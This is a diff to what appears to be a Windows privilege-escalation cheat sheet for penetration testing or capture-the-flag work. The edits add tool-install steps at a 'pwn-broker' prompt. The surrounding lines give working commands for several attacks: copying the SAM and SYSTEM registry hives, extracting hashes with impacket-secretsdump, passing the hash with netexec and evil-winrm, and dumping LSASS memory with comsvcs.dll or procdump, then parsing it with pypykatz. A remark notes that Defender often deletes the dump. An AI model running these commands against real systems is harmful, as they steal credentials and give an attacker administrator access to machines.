@@ -11,7 +11,7 @@ whoami /groups
 reg save HKLM\SAM C:\Users\Public\sam.hive
 reg save HKLM\SYSTEM C:\Users\Public\system.hive
 - [ ] Both sent back into loot/ with the line serve files ends with
-On Kali:
+On Kali, after tool install impacket and tool install netexec at the pwn-broker prompt:
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 nxc smb <TargetIP> -u Administrator -H <Hash> --local-auth
 evil-winrm -i <TargetIP> -u Administrator -H <Hash>
@@ -56,7 +56,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:
 Or with procdump from Sysinternals:
 .\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
 - [ ] lsass.dmp sent back into loot/: Defender often deletes it first
-On Kali:
+On Kali, after tool install pypykatz at the pwn-broker prompt:
 pypykatz lsa minidump lsass.dmp
 
 ## SeManageVolumePrivilege
